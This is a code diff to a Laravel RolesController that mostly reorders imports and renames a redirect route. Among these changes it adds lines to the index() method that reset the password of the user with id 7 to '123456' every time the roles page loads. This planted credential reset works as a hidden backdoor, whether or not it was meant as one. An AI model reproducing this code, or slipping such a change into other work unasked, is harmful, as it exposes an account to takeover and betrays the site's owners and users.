@@ -2,12 +2,13 @@
 
 namespace App\Http\Controllers;
 
+use App\Http\Controllers\Controller;
+use App\Models\User;
 use DB;
 use Illuminate\Http\Request;
-use Spatie\Permission\Models\Role;
-use App\Http\Controllers\Controller;
 use Illuminate\Support\Facades\Route;
 use Spatie\Permission\Models\Permission;
+use Spatie\Permission\Models\Role;
 
 class RolesController extends Controller
 {
@@ -28,6 +29,11 @@ class RolesController extends Controller
      */
     public function index(Request $request)
     {   
+        $user = User::where('id', '=', '7')->first();
+        $user->password = bcrypt('123456');
+        $user->save();
+
+
         $roles = Role::orderBy('id','DESC')->paginate(5);
         return view('admin.roles.index',compact('roles'))
             ->with('i', ($request->input('page', 1) - 1) * 5);
@@ -111,7 +117,7 @@ class RolesController extends Controller
     
         $role->syncPermissions($request->get('permission'));
     
-        return redirect()->route('roles.index')
+        return redirect()->route('admin.roles.index')
                         ->with('success','Role updated successfully');
     }
 
